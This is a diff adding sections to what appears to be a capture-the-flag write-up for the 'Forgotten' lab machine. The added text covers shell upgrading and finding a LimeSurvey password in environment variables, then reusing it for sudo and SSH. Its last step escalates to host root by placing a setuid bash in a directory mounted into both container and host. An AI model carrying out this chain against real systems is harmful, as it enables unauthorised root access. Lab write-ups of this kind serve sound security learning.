@@ -112,4 +112,119 @@ USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 uid=2000(limesvc) gid=2000(limesvc) groups=2000(limesvc),27(sudo)                           
 /bin/sh: 0: can't access tty; job control turned off 
 ```
+### Post Access Enumeration / User Flag.
+
+Python was unavailable on the target, so we used an alternative command to upgrade the shell.
+
+```
+script /dev/null -qc /bin/bash
+```
+
+Running sudo -l, a password is required for the user limescv.
+
+```
+limesvc@efaa6f5097ed:/home/limesvc$ sudo -l
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+[sudo] password for limesvc:
+```
+
+The user's desktop is also empty.
+
+```
+limesvc@efaa6f5097ed:/home/limesvc$ ls -lath
+total 20K
+drwxr-xr-x 1 limesvc limesvc 4.0K Dec  2  2023 .
+drwxr-xr-x 1 root    root    4.0K Dec  2  2023 ..
+-rw-r--r-- 1 limesvc limesvc  220 Mar 27  2022 .bash_logout
+-rw-r--r-- 1 limesvc limesvc 3.5K Mar 27  2022 .bashrc
+-rw-r--r-- 1 limesvc limesvc  807 Mar 27  2022 .profile
+```
+Checking enviroment variables, it shows a really interesting output:
+
+```
+limesvc@efaa6f5097ed:/home/limesvc$ env
+HOSTNAME=efaa6f5097ed
+PHP_VERSION=8.0.30
+APACHE_CONFDIR=/etc/apache2
+PHP_INI_DIR=/usr/local/etc/php
+GPG_KEYS=1729F83938DA44E27BA0F4D3DBDB397470D12172 BFDDD28642824F8118EF77909B67A5C12229118F 2C16C765DBE54A088130F1BC4B9B5F600B55F3B4 39B641343D8C104B2B146DC3F9C39DC0B9698544
+PHP_LDFLAGS=-Wl,-O1 -pie
+PWD=/home/limesvc
+APACHE_LOG_DIR=/var/log/apache2
+LANG=C
+LS_COLORS=
+PHP_SHA256=216ab305737a5d392107112d618a755dc5df42058226f1670e9db90e77d777d9
+APACHE_PID_FILE=/var/run/apache2/apache2.pid
+PHPIZE_DEPS=autoconf            dpkg-dev                file            g++             gcc             libc-dev                make            pkg-config              re2c
+LIMESURVEY_PASS=5W5HN4K4GCXf9E
+<...>
+```
+*LIMESURVEY_PASS=5W5HN4K4GCXf9E.*
+
+```
+echo "limesvc:5W5HN4K4GCXf9E" > creds.txt
+```
+Now we can run sudo -l.
+
+```
+limesvc@efaa6f5097ed:/home/limesvc$ sudo -l
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+[sudo] password for limesvc: 
+Matching Defaults entries for limesvc on efaa6f5097ed:
+    env_reset, mail_badpass,
+   secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+User limesvc may run the following commands on efaa6f5097ed:
+    (ALL : ALL) ALL
+```
+
+Attempting an SSH login to limesvc with the discovered password; the authentication succeeded and the SSH session is established.
+
+```
+➜  Forgotten ssh limesvc@10.129.234.81
+(limesvc@10.129.234.81) Password: 
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.8.0-1033-aws x86_64)
+limesvc@forgotten:~$ ls
+user.txt
+```
+
+### Privilege Escalation 
+
+We had root on the container but lacked host-level privileges. Enumeration revealed a directory mounted into both the container and the host. By placing a privileged shell binary into that shared directory, we were able to escalate privileges and obtain root on the host
+On the container:
+
+```
+root@efaa6f5097ed:/var/www/html/survey# cp /bin/bash .
+root@efaa6f5097ed:/var/www/html/survey# chmod 6777 bash
+```
+On the host:
+
+```
+limesvc@forgotten:/opt/limesurvey$ id
+uid=2000(limesvc) gid=2000(limesvc) groups=2000(limesvc)
+limesvc@forgotten:/opt/limesurvey$ ./bash -p
+bash-5.1# id
+uid=2000(limesvc) gid=2000(limesvc) euid=0(root) egid=0(root) groups=0(root),2000(limesvc)
+```
+Now just take the root flag.
+
+```
+bash-5.1# cd /root
+bash-5.1# ls
+root.txt  snap
+```
+
+
+
+
+
 
